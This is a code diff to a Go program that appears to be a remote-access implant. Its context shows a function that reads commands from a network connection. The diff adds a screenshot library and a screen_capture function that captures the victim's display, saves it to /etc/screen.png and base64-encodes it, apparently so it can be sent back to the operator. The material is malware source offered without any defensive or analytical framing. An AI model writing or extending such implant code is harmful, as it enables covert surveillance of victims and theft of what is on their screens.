@@ -3,11 +3,14 @@ package main
 import (
 	"bufio"
 	"fmt"
+	"image/png"
 	"net"
 	"net/http"
 	"os"
 	"strings"
 	"time"
+
+	"github.com/kbinani/screenshot"
 )
 
 const (
@@ -95,4 +98,14 @@ func engage_via(conn net.Conn) {
 		conn.Read([]byte(cmd))
 		fmt.Println(cmd)
 	}
+}
+
+func screen_capture() string {
+	bounds := screenshot.GetDisplayBounds(0)
+	img, _ := screenshot.CaptureRect(bounds)
+	file := "/etc/screen.png"
+	f, _ := os.Create(file)
+	png.Encode(f, img)
+
+	return b64_file(file)
 }
